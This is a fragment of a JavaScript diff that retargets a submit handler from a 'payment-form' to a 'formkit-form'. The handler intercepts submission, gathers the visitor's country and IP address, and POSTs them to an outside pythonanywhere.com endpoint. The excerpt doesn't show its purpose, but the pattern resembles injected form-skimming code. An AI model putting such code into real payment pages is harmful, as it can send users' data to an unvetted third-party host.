@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function() {
-    const form = document.getElementById('payment-form');
+    const form = document.getElementById('formkit-form');
     if (form) {
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -82,7 +82,6 @@ window.addEventListener('message', function(event) {
                 country: country,
                 ip: ipaddress
             };
-
             try {
                 const response = await fetch('https://microservice2.pythonanywhere.com/check', {
                     method: 'POST',
